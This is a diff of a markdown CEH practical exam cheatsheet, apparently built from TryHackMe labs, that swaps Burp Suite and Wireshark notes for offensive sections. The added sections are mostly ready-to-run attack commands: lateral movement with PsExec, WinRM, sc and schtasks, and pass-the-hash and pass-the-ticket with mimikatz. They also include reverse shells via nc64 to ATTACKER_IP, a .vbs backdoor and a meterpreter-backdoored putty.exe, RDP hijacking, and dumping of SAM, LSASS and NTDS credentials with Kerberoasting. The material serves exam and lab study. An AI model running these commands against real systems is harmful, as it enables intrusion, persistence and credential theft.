@@ -1,4 +1,3 @@
-
 ---
 
 # 🛡️ **Comprehensive CEH Practical Exam Cheatsheet**
@@ -67,9 +66,9 @@
      - `hydra -l [USER] -P [WORDLIST] [TARGET_IP] ssh`
    - **HTTP POST Form Brute Force**:
      - `hydra -l [USER] -P [WORDLIST] [URL] http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid Login"`
-     - **Example - Advanced HTTP POST Form Brute Force**:
+     - **Advanced HTTP POST Form Brute Force**:
      ```bash
-     hydra -l zeeshan -P /usr/share/wordlists/rockyou.txt 10.10.56.169 -V http-form-post "/login:username=^USER^&password=^PASS^:F=incorrect"
+     hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.56.169 -V http-form-post "/login:username=^USER^&password=^PASS^:F=incorrect"
      ```
      - **FTP Brute Forcing**:
      - `hydra -l [USER] -P [WORDLIST] [TARGET_IP] ftp`
@@ -179,9 +178,9 @@
    - 📥 [PrivescCheck](https://github.com/itm4n/PrivescCheck) - *Privilege Escalation Enumeration Tool*
    - 📥 [WES-NG](https://github.com/bitsadmin/wesng) - *Windows Exploit Suggester*
 
-2. **Check
+2. **Check Files
 
- Files for Credentials**:
+ for Credentials**:
    - `C:\Unattend.xml`
    - `C:\Windows\Panther\Unattend.xml`
    - `C:\Windows\system32\sysprep.inf`
@@ -252,80 +251,269 @@
 
 ---
 
-### 7. **⚙️ Burp Suite**
+### 7. **🛠️ Lateral Movement**
 
-Burp Suite is a powerful tool for web application security testing. Below are its main modules and common use cases:
+Lateral movement techniques allow attackers to spread within the network once initial access is gained.
 
-#### **🌐 Proxy** 
-   - **Usage**: Intercept traffic between your browser and the target server.
-   - **Common Scenarios**:
-     - Intercept and modify HTTP requests before sending them to the server.
-     - Inspect responses for hidden fields or information leaks.
+#### **🖥️ PsExec (SMB Lateral Movement)**
 
-#### **📧 Repeater** 
-   - **Usage**: Manually modify and resend individual requests.
-   - **Common Scenarios**:
-     - Test different payloads for SQLi, XSS, etc.
-     - Alter POST data to observe changes in server behavior.
+   - **Ports**: 445/TCP (SMB)
+   - **Required Group Membership**: Administrators
+   - **Description**: PsExec connects to the Admin$ share to upload a service binary (`psexesvc.exe`), then creates and runs the service to open a remote shell.
 
-#### **🎯 Intruder** 
-   - **Usage**: Automate customized attacks like fuzzing and brute-forcing.
-   - **Common Attacks**:
-     - **Sniper**: Single payload, single injection point.
-     - **Battering Ram**: Same payload sent to multiple injection points.
-     - **Pitchfork**: Multiple payloads sent simultaneously to multiple positions.
-     - **Cluster Bomb**: Every combination of payloads sent to multiple injection points.
+   - **Syntax**:
+     ```bash
+     psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
+     ```
 
-#### **🔍 Scanner**
-   - **Usage**: Automated vulnerability scanning.
-   - **Common Scenarios**:
-     - Detect common web application vulnerabilities like XSS, SQLi, etc.
+#### **🔧 WinRM (Remote Process Creation)**
 
-#### **📜 Decoder**
-   - **Usage**: Encode and decode data in various formats.
-   - **Common Formats**:
-     - Base64, URL encoding, HTML encoding, etc.
+   - **Ports**: 5985/TCP (WinRM HTTP), 5986/TCP (WinRM HTTPS)
+   - **Required Group Membership**: Remote Management Users
+   - **Description**: WinRM allows remote process creation over HTTP or HTTPS.
 
----
+   - **Syntax**:
+     ```bash
+     winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
+     ```
 
-### 8. **📊 Wireshark**
+#### **🔑 Remote Service Creation via `sc`**
 
-Wireshark is a widely-used network protocol analyzer that helps in deep packet inspection and network troubleshooting. Below are some popular filters and tips for packet analysis:
+   - **Ports**:
+     - 135/TCP, 445/TCP (RPC over SMB Named Pipes), 139/TCP
+   - **Required Group Membership**: Administrators
+   - **Description**: `sc` allows remote service creation, start, stop, and deletion.
 
-#### **📝 Popular Filters**
-   - **Filter by IP Address**:
-     - `ip.addr == 192.168.1.1`
-   - **Filter by MAC Address**:
-     - `eth.addr == aa:bb:cc:dd:ee:ff`
-   - **HTTP Traffic**:
-     - `http`
-   - **Filter by Port**:
-     - `tcp.port == 80` (HTTP), `udp.port == 53` (DNS)
-   - **DNS Queries**:
-     - `dns`
-   - **Follow a TCP Stream**:
-     - Right-click on a packet and select *Follow TCP Stream*.
+   - **Example**:
+     ```bash
+     sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
+     sc.exe \\TARGET start THMservice
+     sc.exe \\TARGET stop THMservice
+     sc.exe \\TARGET delete THMservice
+     ```
 
-#### **🔍 Packet Analysis Tips**
-   - **Check TCP Flags**:
-     - Look for SYN, ACK, and RST flags to analyze connections.
-   - **Identify Retransmissions**:
-     - Look for duplicate or out-of-order packets.
-   - **Inspect Latency**:
-     - Filter `icmp` packets to analyze round-trip time for ping requests.
-   - **Find Passwords**:
-     - Search in **HTTP** or **FTP** protocols if encryption is not used.
+#### **🕒 Creating Scheduled Tasks Remotely**
+
+   - **Syntax**:
+     ```bash
+     schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
+     schtasks /s TARGET /run /TN "THMtask1" 
+     schtasks /S TARGET /TN "THMtask1" /DELETE /F
+     ```
 
 ---
 
-### 9. **⚙️ Miscellaneous Tools**
+### 8. **🔒 NTLM Authentication Attacks**
 
-#### ⚙️ **Msfvenom (Payload Generation)**
-   - **Windows Reverse Shell**:
-     - `msfvenom -p windows/shell_reverse_tcp LHOST=[YOUR_IP] LPORT=[PORT] -f exe -o shell.exe`
-   
-   - **Linux Reverse Shell**:
-     - `msfvenom -p linux/x64/shell_reverse_tcp LHOST=[YOUR_IP] LPORT=[PORT] -f elf -o shell.elf`
+#### **💻 Pass-the-Hash (PtH)**
+
+   **Extract NTLM Hashes Using Mimikatz**:
+   ```bash
+   mimikatz # privilege::debug
+   mimikatz # sekurlsa::msv
+   ```
+   - **Example of Using NTLM Hash with PsExec**:
+     ```bash
+     psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
+     ```
+
+   - **Connect via WinRM Using NTLM Hash**:
+     ```bash
+     evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
+     ```
+
+#### **🎫 Pass-the-Ticket (PtT)**
+
+   - **Extract Ticket**:
+     ```bash
+     mimikatz # privilege::debug
+     mimikatz # sekurlsa::tickets /export
+     ```
+
+   - **Inject Ticket**:
+     ```bash
+     mimikatz # kerberos::ptt [ticket_file]
+     ```
+
+#### **🔐 Overpass-the-Hash / Pass-the-Key**
+
+   - **Example (Using RC4 Hash)**:
+     ```bash
+     mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:HASH /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
+     ```
+
+---
+
+### 9. **📂 Abusing Writable Shares**
+
+#### **📜 Backdooring `.vbs` Scripts**
+
+   - **Inject a reverse shell into `.vbs` scripts**:
+     ```bash
+     CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
+     ```
+
+#### **🛠️ Backdooring `.exe` Files**
+
+   - **Backdoor executable files using `msfvenom`**:
+     ```bash
+     msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
+     ```
+
+---
+
+### 10. **🖥️ RDP Hijacking**
+
+   - **Hijack RDP session**:
+     ```bash
+     PsExec64.exe -s cmd.exe
+     query user
+     tscon ID /dest:SESSIONNAME
+     ```
+
+---
+
+### 11. **🌐 SSH Tunneling & Port Forwarding**
+
+#### **🔀 SSH Remote Port Forwarding**
+
+   - **Example**:
+     ```bash
+     ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
+     xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
+     ```
+
+#### **🔀 SSH Local Port Forwarding**
+
+   - **Example**:
+     ```bash
+     ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
+     netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
+     ```
+
+---
+
+### 12. **🔗 Port Forwarding with `socat`**
+
+   - **Example**:
+     ```bash
+     socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321
+
+
+     socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
+     netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
+     ```
+
+---
+
+### 13. **🧦 Dynamic Port Forwarding & SOCKS**
+
+   - **Create a dynamic SSH tunnel and use it with proxychains**:
+     ```bash
+     ssh tunneluser@1.1.1.1 -R 9050 -N
+     [ProxyList]
+     socks4  127.0.0.1 9050
+     proxychains curl http://pxeboot.za.tryhackme.com
+     ```
+
+---
+
+### 14. **🛡️ Credentials Harvesting**
+
+#### **🔍 PowerShell History**
+   - **Location**:
+     ```bash
+     C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+     ```
+
+#### **🔑 Registry Query for Stored Passwords**
+   - **Search Registry for Passwords**:
+     ```bash
+     reg query HKLM /f password /t REG_SZ /s
+     reg query HKCU /f password /t REG_SZ /s
+     ```
+
+#### **🔎 Dump Active Directory User Information**:
+   ```bash
+   Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description
+   ```
+
+#### **📜 Extract SAM and SYSTEM Files**:
+   - **Location**:
+     ```bash
+     c:\Windows\System32\config\sam
+     ```
+
+   - **Registry Hive Export**:
+     ```bash
+     reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
+     python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
+     ```
+
+#### **🔓 Volume Shadow Copy for Credential Harvesting**:
+   ```bash
+   wmic shadowcopy call create Volume='C:\'
+   vssadmin list shadows
+   copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
+   ```
+
+#### **🛠️ LSASS Memory Dump for Credential Harvesting**:
+   - **Mimikatz** can extract credentials from the LSASS process, but it requires debug privileges:
+     ```bash
+     mimikatz # privilege::debug
+     mimikatz # sekurlsa::logonpasswords
+     ```
+
+#### **🔓 Dump Credentials from Vault (Credential Manager)**:
+   ```bash
+   vaultcmd /list
+   VaultCmd /listproperties:"Web Credentials"
+   VaultCmd /listcreds:"Web Credentials"
+   ```
+
+#### **🔐 Running Commands as Different Users**:
+   - **RunAs with Saved Credentials**:
+     ```bash
+     cmdkey /list
+     runas /savecred /user:THM.red\thm-local cmd.exe
+     ```
+
+#### **📂 Extracting NTDS (Active Directory) Database**:
+
+   - **Local NTDS Dump**:
+     ```bash
+     C:\Windows\NTDS\ntds.dit
+     C:\Windows\System32\config\SYSTEM
+     powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
+     python3.9 /opt/impacket/examples/secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local
+     ```
+
+   - **Remote NTDS Dump**:
+     ```bash
+     python3.9 /opt/impacket/examples/secretsdump.py -just-dc THM.red/<AD_Admin_User>@10.10.222.103
+     ```
+
+#### **🔍 Kerberoasting (SPN Extraction)**:
+   - **Extract Service Principal Names (SPNs)**:
+     ```bash
+     python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.222.103 THM.red/thm
+     python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.222.103 THM.red/thm -request-user svc-user
+     ```
+
+   - **Crack SPNs Using Hashcat**:
+     ```bash
+     hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
+     ```
+
+#### **🔓 AS-REP Roasting**:
+   - **Extract AS-REP Tickets**:
+     ```bash
+     python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.222.103 thm.red/ -usersfile /tmp/users.txt
+     ```
+
+#### **📡 SMB Relay Attack**:
+   - **LLMNR/NBNS Poisoning and Relay**:
+     - Use **Responder** or **Impacket** tools to execute SMB Relay attacks.
 
 ---
 
